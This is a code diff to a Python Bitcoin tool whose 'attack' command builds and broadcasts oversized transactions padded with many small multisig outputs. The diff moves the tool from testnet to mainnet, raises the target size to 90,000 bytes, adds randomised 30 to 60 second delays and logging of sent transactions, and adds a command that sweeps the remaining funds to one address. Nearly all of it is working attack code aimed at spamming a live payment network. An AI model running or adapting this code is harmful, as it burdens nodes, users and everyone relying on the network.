@@ -23,7 +23,7 @@ from bitcoin.core.script import (OP_0, OP_DUP, OP_HASH160, OP_EQUALVERIFY, OP_CH
 from bitcoin.core.scripteval import VerifyScript
 from bitcoin.wallet import CBitcoinAddress, CBitcoinSecret
 
-netname = 'testnet'
+netname = 'mainnet'
 bitcoin.SelectParams(netname)
 
 class Wallet:
@@ -50,7 +50,7 @@ class Wallet:
         self.outpoints_by_block = {}
         self.unspent_txouts = {}
         if seed_birthday is None:
-            seed_birthday = time.time() - 24*60*60 # one day
+            seed_birthday = time.time() - 4*24*60*60
         self.seed_birthday = seed_birthday
 
         self.known_blocks = []
@@ -120,7 +120,7 @@ class Wallet:
     def scan_tx(self, tx, block_hash=None):
         tx_hash = tx.get_hash()
 
-        logging.debug('Checking tx %s for transactions' % b2lx(tx_hash))
+        #logging.debug('Checking tx %s for transactions' % b2lx(tx_hash))
 
         num_found = 0
         # Remove spent
@@ -221,6 +221,7 @@ def getnewaddress_command(args):
 def attack_command(args):
     #args.starting_height = 2**32-1
     #scan_command(args)
+    fd = open('sent-txs','a')
 
     for txhash in args.rpc.getrawmempool():
         txhash = lx(txhash)
@@ -252,9 +253,9 @@ def attack_command(args):
 
         # Assuming the whole tx is CTxOut's, each one is 46 bytes (1-of-1
         # CHECKMULTISIG) and the value out needs to be at least 1000 satoshis.
-        avg_txout_size = 25+1+8
+        avg_txout_size = 46 #25+1+8
         num_txouts = args.target_tx_size // avg_txout_size
-        min_value_out = 1000
+        min_value_out = 10000
         sum_min_value_out = num_txouts * min_value_out
 
         fees = (args.target_tx_size/1000) * args.fee_per_kb
@@ -263,7 +264,8 @@ def attack_command(args):
         tx_size = len(tx.serialize())
         dummy_scriptSig = CScript([b'\x00'*74])
         while (sum_value_in < fees + sum_min_value_out
-               and tx_size < args.target_tx_size/2): # don't devote more than half the tx to inputs
+               and tx_size < args.target_tx_size/2 # don't devote more than half the tx to inputs
+               and available_txouts):
             outpoint, txout = available_txouts.popleft()
 
             try:
@@ -277,8 +279,7 @@ def attack_command(args):
             # The CTxIn has a dummy signature so size calculations will be right
             txin = CTxIn(outpoint, dummy_scriptSig)
             tx.vin.append(txin)
-            #tx_size += len(txin.serialize())
-            tx_size += 116+34 # hardcoding for some speed
+            tx_size += len(txin.serialize())
 
         total_funds -= sum_value_in
 
@@ -291,7 +292,7 @@ def attack_command(args):
         # Split the funds out evenly among all transaction outputs.
         per_txout_value = (sum_value_in - fees) // num_txouts
         for i in range(num_txouts):
-            scriptPubKey = args.wallet.make_paytopubkeyhash()
+            scriptPubKey = args.wallet.make_multisig()
             txout = CTxOut(per_txout_value, scriptPubKey)
             tx.vout.append(txout)
 
@@ -304,6 +305,7 @@ def attack_command(args):
 
             if prevout_scriptPubKey[-1] == OP_CHECKMULTISIG:
                 txin.scriptSig = CScript([OP_0, sig])
+
             elif prevout_scriptPubKey[-1] == OP_CHECKSIG and prevout_scriptPubKey[-2] == OP_EQUALVERIFY:
                 txin.scriptSig = CScript([sig, seckey.pub])
 
@@ -334,11 +336,51 @@ def attack_command(args):
         #args.wallet.save()
         try:
             args.rpc.sendrawtransaction(tx)
+            fd.write(b2x(serialized_tx) + '\n')
+            fd.flush()
         except bitcoin.rpc.JSONRPCException as exp:
             print(b2x(tx.serialize()))
-            import pdb; pdb.set_trace()
+            #import pdb; pdb.set_trace()
 
-        time.sleep(0.1)
+        time.sleep(random.randrange(30,60))
+
+
+def recover_command(args):
+    args.fee_per_kb = int(args.fee_per_kb * COIN)
+    addr = CBitcoinAddress(args.addr)
+
+    tx = CTransaction()
+
+    sum_value_in = 0
+    dummy_scriptSig = CScript([b'\x00'*74])
+    inputs = {}
+    for outpoint, txout in tuple(args.wallet.unspent_txouts.items())[0:500]:
+        sum_value_in += txout.nValue
+        tx.vin.append(CTxIn(outpoint, dummy_scriptSig))
+        inputs[outpoint] = txout
+
+    tx.vout.append(CTxOut(-1, addr.to_scriptPubKey()))
+
+    fees = int((len(tx.serialize())/1000) * args.fee_per_kb)
+
+    tx.vout[0].nValue = sum_value_in - fees
+
+    # Sign the transaction
+    for (i, txin) in enumerate(tx.vin):
+        prevout_scriptPubKey = inputs[txin.prevout].scriptPubKey
+        sighash = SignatureHash(prevout_scriptPubKey, tx, i, SIGHASH_ALL)
+        seckey = args.wallet.keypairs[prevout_scriptPubKey]
+        sig = seckey.sign(sighash) + bytes([SIGHASH_ALL])
+
+        if prevout_scriptPubKey[-1] == OP_CHECKMULTISIG:
+            txin.scriptSig = CScript([OP_0, sig])
+
+        elif prevout_scriptPubKey[-1] == OP_CHECKSIG and prevout_scriptPubKey[-2] == OP_EQUALVERIFY:
+            txin.scriptSig = CScript([sig, seckey.pub])
+
+        VerifyScript(txin.scriptSig, prevout_scriptPubKey, tx, i)
+
+    print(b2x(tx.serialize()))
 
 
 parser = argparse.ArgumentParser()
@@ -368,16 +410,29 @@ parser_attack = subparsers.add_parser('attack', help='Run attack')
 parser_attack.add_argument('--fee-per-kb', action='store',
                            dest='fee_per_kb',
                            type=float,
-                           default=0.000011,
+                           default=0.00011,
                            help='fee per KB')
 parser_attack.add_argument('--target-tx-size', action='store',
                            dest='target_tx_size',
                            type=int,
-                           default=1000,
+                           default=90000,
                            help='target transaction size')
 parser_attack.set_defaults(func=attack_command)
 
+parser_recover = subparsers.add_parser('recover', help='Recover funds')
+parser_recover.add_argument('--fee-per-kb', action='store',
+                            dest='fee_per_kb',
+                            type=float,
+                            default=0.001,
+                            help='fee per KB')
+parser_recover.add_argument('addr', action='store',
+                         type=str,
+                         help='address to send funds to')
+parser_recover.set_defaults(func=recover_command)
+
+
 args = parser.parse_args()
+
 
 args.rpc = bitcoin.rpc.Proxy()
 
